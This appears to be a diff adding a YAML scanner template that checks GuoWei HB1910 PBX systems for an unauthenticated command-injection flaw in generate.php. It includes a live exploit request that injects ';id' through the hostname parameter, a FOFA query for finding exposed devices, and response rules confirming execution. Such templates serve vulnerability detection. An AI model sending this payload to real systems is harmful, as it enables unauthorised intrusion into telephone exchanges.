@@ -1,0 +1,30 @@
+id: guowei-hb1910-generate-rce
+info:
+  name: GuoWei HB1910 PBX generate.php Remote Command Execution
+  author: ZacharyZcR
+  severity: critical
+  description: |
+    GuoWei HB1910 Digital PBX System generate.php interface has an unauthenticated remote command execution vulnerability.
+    An attacker can execute arbitrary system commands by sending a specially crafted request.
+    FOFA: body="themes/tenant/css/login.css"
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%B7%B1%E5%9C%B3%E5%9B%BD%E5%A8%81%E7%94%B5%E5%AD%90/%E5%9B%BD%E5%A8%81HB1910%E6%95%B0%E5%AD%97%E7%A8%8B%E6%8E%A7%E7%94%B5%E8%AF%9D%E4%BA%A4%E6%8D%A2%E6%9C%BAgenerate.php%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E.md
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /modules/ping/generate.php?send=Ping&hostname=;id
+      headers:
+        Accept: "*/*"
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    expression: |
+      response.status == 200 && 
+      response.headers["Server"].contains("Apache") &&
+      response.headers["X-Powered-By"].contains("PHP") &&
+      response.body.bcontains(b'uid=') && 
+      response.body.bcontains(b'gid=') && 
+      response.body.bcontains(b'groups=') &&
+      response.body.bcontains(b'asterisk')
+
+expression: r0()
